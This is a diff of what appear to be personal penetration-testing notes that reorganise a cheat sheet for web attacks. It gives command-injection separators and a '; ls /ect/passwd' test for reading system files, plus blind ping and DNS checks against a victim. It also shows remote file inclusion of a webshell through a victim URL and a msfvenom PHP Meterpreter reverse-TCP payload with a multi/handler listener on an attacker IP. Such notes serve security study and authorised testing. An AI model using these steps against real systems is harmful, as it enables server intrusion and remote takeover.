@@ -6,22 +6,11 @@ order: 4
 
 > **Command Injection**
 
-Prefixs before attack payload (command seperator): 
-{% highlight bash %}
-&, &&, ||,  <, >, ;, $()
-{% endhighlight %}
+Prefixs before attack payload (command seperator): | <code> &, &&, ||,  <, >, ;, $() </code>
+Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
+Test Blind Ping: | <code> ; ping y.o.ur.ip <br> on your attack system "sudo tcpdump -n host [victimIP] and icmp" </code>
+Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
 
-Test Visable:
-{% highlight bash %}
-; ls /ect/passwd or /ect/hosts
-{% endhighlight %}
-
-Test Blind:
-{% highlight bash %}
-; ping y.o.ur.ip 
-on your attack system "sudo tcpdump -n host [victimIP] and icmp"
-; nslookup (you need a public facing system to see nslookup)
-{% endhighlight %}
 
 
 > **File Inclusion**
@@ -62,19 +51,20 @@ Auto-Extension Bypass:
 
 1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
 2. python -m SimpleHTTPServer 8080
-3. set up netcat listener (if needed based on webshell)
+3. Set up netcat listener (if needed based on webshell)
 3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
 Meterpreter:
-1) Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
-2) Wrap it: add <?php ?> to the payload
-4)  Set up handler: 
-use exploit/multi/handler
-set payload php/meterpreter_reverse/tcp
-set lhost 192.168.1.8
-set lport 1234
+1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
+2. Wrap it: add <?php ?> to the payload
+3.  Set up handler: 
+* use exploit/multi/handler
+* set payload php/meterpreter_reverse/tcp
+* set lhost 192.168.1.8
+* set lport 1234
 exploit
-3)  python -m SimpleHTTPServer 8080
+4.  python -m SimpleHTTPServer 8080
+5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
 > **SQL Injection: Test Strings**
 
